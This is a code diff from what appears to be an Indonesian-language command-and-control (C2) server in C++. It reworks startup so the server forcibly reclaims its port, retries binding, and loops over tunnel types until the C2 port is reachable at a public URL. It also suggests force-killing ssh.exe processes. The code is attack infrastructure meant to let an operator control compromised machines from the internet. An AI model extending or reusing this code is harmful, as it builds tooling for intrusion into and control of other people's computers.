@@ -60,33 +60,49 @@ int main(int argc, char* argv[]) {
 #endif
 
     PrintBanner();
-
+    std::cout << INFO_TAG << "Mengecek status sistem Core..." << std::endl;
     std::string test = SendIPCRequest("STATUS");
     if (test == "ERR_CONN" || test == "ERR_READ") {
         is_master_process = true;
+        
+        // --- AGGRESSIVE PORT RECOVERY ---
+        // Clean up any lingering tunnel processes that might hold port handles
+        CleanupSystem();
+        std::this_thread::sleep_for(std::chrono::milliseconds(200));
+
         std::cout << INFO_TAG << "Starting Server Engine..." << std::endl;
         
-        // Cek Port
-        if (!IsPortAvailable(SERVER_PORT)) {
-            std::cout << ERROR_TAG << "Port C2 (" << SERVER_PORT << ") sedang digunakan!" << std::endl;
-            return 1;
-        }
-        if (!IsPortAvailable(INTERNAL_IPC_PORT)) {
-            std::cout << ERROR_TAG << "Port IPC (" << INTERNAL_IPC_PORT << ") sedang digunakan!" << std::endl;
-            return 1;
-        }
-
         SSL_library_init();
         OpenSSL_add_all_algorithms();
         SSL_load_error_strings();
 
         SSLServer server(SERVER_PORT, "cert/cert.pem", "cert/key.pem");
-        if (!server.Start()) {
+        
+        // Retry loop for real-time port reclaiming
+        bool server_started = false;
+        for (int i = 0; i < 3; i++) {
+            if (server.Start()) {
+                server_started = true;
+                break;
+            }
+            std::cout << WARNING_TAG << "Port " << SERVER_PORT << " sedang digunakan. Membersihkan dan mencoba ulang (" << (i + 1) << "/3)..." << std::endl;
+            CleanupSystem();
+            std::this_thread::sleep_for(std::chrono::milliseconds(800));
+        }
+
+        if (!server_started) {
+            std::cout << ERROR_TAG << "FATAL: Port C2 (" << SERVER_PORT << ") terkunci oleh proses lain!" << std::endl;
+            std::cout << INFO_TAG << "Saran: Jalankan perintah 'taskkill /F /IM ssh.exe /T' secara manual atau restart komputer." << std::endl;
             return 1;
         }
 
-        std::string public_url;
-        StartTunnelAndGetUrl(SERVER_PORT, public_url);
+        while (true) {
+            TunnelType selected_type = SelectTunnelType();
+            std::string public_url;
+            StartTunnelAndGetUrl(SERVER_PORT, public_url, selected_type);
+            if (global_public_url != "None") break;
+            std::cout << ERROR_TAG << "Gagal menginisialisasi tunnel. Silakan pilih metode lain." << std::endl;
+        }
 
         std::thread ipc_thread(IPCServerThread);
         ipc_thread.detach();
